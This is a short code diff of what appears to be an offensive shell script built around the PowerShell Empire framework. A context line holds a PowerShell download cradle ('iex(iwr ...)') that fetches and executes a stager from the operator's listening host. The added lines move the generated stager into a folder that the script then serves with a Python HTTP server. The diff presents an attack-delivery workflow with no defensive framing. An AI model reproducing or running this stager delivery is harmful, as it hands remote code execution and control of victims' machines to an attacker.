@@ -95,6 +95,9 @@ iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/${dp})
     echo "$__COMMAND" | wl-copy
     __info "Commands to download the stager copied to clipboard."
 
+    # MOVE IT TO server
+    sudo mv /var/lib/powershell-empire/empire/client/generated-stagers/${dp} $HOME/desktop/server
+
     # Run the server
     echo
     cd "$HOME/desktop/server" ; echo "$(hip) in $PWD" ; sudo python3 -m http.server 8000
